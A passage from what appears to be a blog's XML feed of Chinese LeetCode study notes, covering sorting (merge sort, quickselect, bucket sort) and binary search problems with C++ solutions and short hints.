class="built_in">mergeSort</span>(nums, cache, mid + <span class="number">1</span>, r);</span><br><span class="line">  <span class="type">int</span> i = l, j = mid + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> pos = l; pos &lt;= r; ++pos) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j &gt; r || (i &lt;= mid &amp;&amp; nums[i] &lt;= nums[j])) &#123;</span><br><span class="line">          cache[pos] = nums[i++];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          cache[pos] = nums[j++];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> pos = l; pos &lt;= r; ++pos) &#123;</span><br><span class="line">      nums[pos] = cache[pos];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>补充：归并排序是稳定的排序，复杂度也是<code>O(nlogn)</code>，但是实际速度不如快排。</p></li></ul><h2 id="三、快速选择"><a href="#三、快速选择" class="headerlink" title="三、快速选择"></a>三、快速选择</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/kth-largest-element-in-an-array">数组中的第K个最大元素</a><br>在一个未排序的数组中，找到第k大的数字。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findKthLargest</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> pivot = <span class="built_in">rand</span>() % len;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; larger;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; smaller;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; equal;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; nums[pivot]) </span><br><span class="line">                larger.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] == nums[pivot])</span><br><span class="line">                equal.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                smaller.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> largerLen = larger.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> smallerLen = smaller.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> equalLen = equal.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (largerLen == k - <span class="number">1</span> || (largerLen &lt; k &amp;&amp; equalLen + largerLen &gt;= k))</span><br><span class="line">            <span class="keyword">return</span> nums[pivot];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (largerLen &gt;= k)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findKthLargest</span>(larger, k);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findKthLargest</span>(smaller, k - largerLen - equalLen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：利用快排的思想，只需要找到某个pivot即可。</p></li></ul><h2 id="四、桶排序"><a href="#四、桶排序" class="headerlink" title="四、桶排序"></a>四、桶排序</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/top-k-frequent-elements">前k个高频元素</a><br>给你一个整数数组nums和一个整数k，请你返回其中出现频率前k高的元素。你可以按<strong>任意顺序</strong>返回答案。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">topKFrequent</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; map;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            ++map[num];</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;&gt; reMap;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [key, val] : map) &#123;</span><br><span class="line">            reMap[val].<span class="built_in">push_back</span>(key);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>(); i &gt;= <span class="number">0</span> &amp;&amp; k &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (reMap[i].<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; reMap[i].<span class="built_in">size</span>() &amp;&amp; k &gt; <span class="number">0</span>; ++j) &#123;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(reMap[i][j]);</span><br><span class="line">                    --k;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用hashMap可以减少存储空间。</p></li></ul><h2 id="五、练习"><a href="#五、练习" class="headerlink" title="五、练习"></a>五、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/sort-characters-by-frequency">根据字符出现频率排序</a><br>给定一个字符串s，根据字符出现的频率对其进行<strong>降序排序</strong>。一个字符出现的频率是它出现在字符串中的次数。返回<strong>已排序的字符串</strong>。如果有多个答案，返回其中任何一个。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">frequencySort</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; map;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : s) &#123;</span><br><span class="line">            ++map[c];</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, vector&lt;<span class="type">char</span>&gt;&gt; reMap;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [key, val] : map) &#123;</span><br><span class="line">            reMap[val].<span class="built_in">push_back</span>(key);</span><br><span class="line">        &#125;</span><br><span class="line">        string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = s.<span class="built_in">length</span>(); i &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (reMap[i].<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">char</span> c : reMap[i]) &#123;</span><br><span class="line">                    <span class="function">string <span class="title">tmp</span><span class="params">(i, c)</span></span>;</span><br><span class="line">                    res += tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：桶排序的变式。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/sort-colors">颜色排序</a><br>给定一个包含红色、白色和蓝色、共n个元素的数组nums，<strong>原地</strong>对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。我们使用整数0、1和2分别表示红色、白色和蓝色。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">sortColors</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ptr0 = <span class="number">0</span>, ptr1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i], nums[ptr1]);</span><br><span class="line">                ++ptr1;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i], nums[ptr0]);</span><br><span class="line">                <span class="keyword">if</span> (ptr0 &lt; ptr1) <span class="built_in">swap</span>(nums[i], nums[ptr1]);</span><br><span class="line">                ++ptr0;</span><br><span class="line">                ++ptr1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：更像双指针的题目，只需要把0和1排好即可把2排好。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 排序算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(三): 二分查找</title>
      <link href="/post/53d77927.html"/>
      <url>/post/53d77927.html</url>
      
        <content type="html"><![CDATA[<p>二分查找算法的核心思想：二分查找也常被称为二分法或者折半查找 (binary search, bisect)，每次查找时通过将待查找的单调区间分成两部分并只取一部分继续查找，将查找的复杂度大大减少。对于一个长度为<code>O(n)</code>的数组，二分查找的时间复杂度为<code>O(logn)</code>。</p><h2 id="一、求开方"><a href="#一、求开方" class="headerlink" title="一、求开方"></a>一、求开方</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/sqrtx">x 的平方根</a><br>给定一个非负整数 x，求它的开方，向下取整。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">1</span>, r = x, mid, x_div_mid;</span><br><span class="line">    <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">        mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">        x_div_mid = x / mid;</span><br><span class="line">        <span class="keyword">if</span> (mid == x_div_mid) &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (mid &lt; x_div_mid) &#123;</span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解答二：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> t = x;</span><br><span class="line">    <span class="keyword">while</span> (t * t &gt; x) &#123;</span><br><span class="line">        t = (t + x / t) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示：使用除法可以防止溢出，也可以使用<strong>牛顿迭代法</strong>: 其公式为 $t_{n+1}&#x3D;t_{n}−\frac{f(t_{n})}{f′(t_{n})}$。给定$f(t)&#x3D;t2−x&#x3D;0$，这里的迭代公式为 $t_{n+1}&#x3D;\frac{t_{n}+\frac{x}{t_{n}}}{2}$。</p></li></ul><h2 id="二、查找区间"><a href="#二、查找区间" class="headerlink" title="二、查找区间"></a>二、查找区间</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array">在排序数组中查找元素的第一个和最后一个位置</a><br>给定一个增序的整数数组和一个值，查找该值第一次和最后一次出现的位置。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowerBound</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>(), mid;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">upperBound</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = nums.<span class="built_in">size</span>(), mid;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt;= target) &#123;</span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">searchRange</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> lower = <span class="built_in">lowerBound</span>(nums, target);</span><br><span class="line">    <span class="type">int</span> upper = <span class="built_in">upperBound</span>(nums, target) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (lower == nums.<span class="built_in">size</span>() || nums[lower] != target) &#123;</span><br><span class="line">        <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;lower, upper&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示：注意当要查找第一个出现的位置时，l要尽可能的小，也就是必须大于才会等于mid+1，最大值则是等于。</p></li></ul><h2 id="三、查找峰值"><a href="#三、查找峰值" class="headerlink" title="三、查找峰值"></a>三、查找峰值</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/find-peak-element">寻找峰值</a><br>给定一个数组，定义峰值为比所有两边都大的数字，求峰值的位置。一个数组里可能存在多个峰值，返回任意一个即可。时间复杂度要求为 <code>O(log⁡n)</code>。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findPeakElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> length = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">size</span>() == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[<span class="number">0</span>] &gt; nums[<span class="number">1</span>]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[length - <span class="number">1</span>] &gt; nums[length - <span class="number">2</span>]) <span class="keyword">return</span> length - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> low = <span class="number">1</span>, high = length - <span class="number">2</span>, middle = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[middle] &gt; nums[middle + <span class="number">1</span>] &amp;&amp; nums[middle] &gt; nums[middle - <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">return</span> middle;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (nums[middle] &lt;= nums[middle - <span class="number">1</span>])</span><br><span class="line">                high = middle - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> low = middle + <span class="number">1</span>;</span><br><span class="line">            middle = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意边界值。</p></li></ul><h2 id="四、旋转数组查找数字"><a href="#四、旋转数组查找数字" class="headerlink" title="四、旋转数组查找数字"></a>四、旋转数组查找数字</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/search-in-rotated-sorted-array-ii">搜索旋转排序数组 II</a><br>一个原本非递减序的数组被首尾相连后按某个位置断开（如 [1,2,2,3,4,5] → [2,3,4,5,1,2]，在第一位和第二位断开），我们称其为旋转数组。给定一个值，判断这个值是否存在于这个旋转数组中。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">search</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> low = <span class="number">0</span>, high = nums.<span class="built_in">size</span>() - <span class="number">1</span>, middle = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">            <span class="keyword">if</span> (target &gt; nums[middle]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[middle] &gt; nums[high] || nums[high] &gt;= target) low = middle + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> --high;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; nums[middle]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[middle] &lt; nums[high] || nums[low] &lt;= target) high = middle - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> ++low;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            middle = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意旋转数组的性质，旋转到后面的数的最大值一定小于等于旋转到前面的最小值。</p></li></ul><h2 id="五、练习"><a href="#五、练习" class="headerlink" title="五、练习"></a>五、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/find-minimum-in-rotated-sorted-array-ii/">寻找旋转排序数组中的最小值 II</a><br>已知一个长度为 <code>n</code> 的数组，预先按照升序排列，经由 <code>1</code> 到 <code>n</code> 次 <strong>旋转</strong> 后，得到输入数组。例如，原数组 <code>nums = [0,1,4,4,5,6,7]</code> 在变化后可能得到：</p><ul><li>若旋转 <code>4</code> 次，则可以得到 <code>[4,5,6,7,0,1,4]</code></li><li>若旋转 <code>7</code> 次，则可以得到 <code>[0,1,4,4,5,6,7]</code><br>注意，数组 <code>[a[0], a[1], a[2], ..., a[n-1]]</code> <strong>旋转一次</strong> 的结果为数组 <code>[a[n-1], a[0], a[1], a[2], ..., a[n-2]]</code> 。<br>给你一个可能存在 <strong>重复</strong> 元素值的数组 <code>nums</code> ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 <strong>最小元素</strong> 。</li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMin</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> low = <span class="number">0</span>, high = len - <span class="number">1</span>, mid = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] &gt; nums[high]) low = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (nums[low] &lt; nums[high]) high = mid - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> --high;</span><br><span class="line">            mid = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[low];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：想想为什么<code>high--</code>。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/single-element-in-a-sorted-array/">有序数组中的单一元素</a><br>给你一个仅由整数组成的有序数组，其中每个元素都会出现两次，唯有一个数只会出现一次。<br>请你找出并返回只出现一次的那个数。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">singleNonDuplicate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">0</span>) <span class="keyword">return</span> nums[len];</span><br><span class="line">        <span class="keyword">if</span> (nums[<span class="number">0</span>] != nums[<span class="number">1</span>]) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (nums[len] != nums[len - <span class="number">1</span>]) <span class="keyword">return</span> nums[len];</span><br><span class="line">        <span class="type">int</span> low = <span class="number">0</span>, high = len, mid = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mid % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[mid] == nums[mid + <span class="number">1</span>])</span><br><span class="line">                    low = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[mid] == nums[mid - <span class="number">1</span>])</span><br><span class="line">                    low = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mid = (low + high) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[low];</span><br><span class="line">    &#125;</span><br><span 